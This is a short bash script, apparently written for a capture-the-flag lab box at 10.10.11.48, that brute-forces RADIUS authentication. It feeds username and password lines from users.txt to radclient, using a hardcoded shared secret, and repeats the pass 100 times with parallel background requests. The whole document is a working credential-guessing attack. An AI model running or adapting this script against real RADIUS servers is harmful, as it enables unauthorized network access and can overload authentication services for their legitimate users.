#!/bin/bash

# Target RADIUS server details
SERVER_IP="10.10.11.48"
SERVER_PORT="1812"
SECRET="fuckyou"

# Loop through usernames and passwords
for i in {1..100}; do
  while IFS= read -r line; do
    echo "$line" | radclient -x "$SERVER_IP:$SERVER_PORT" auth "$SECRET" &
  done < users.txt
done
wait
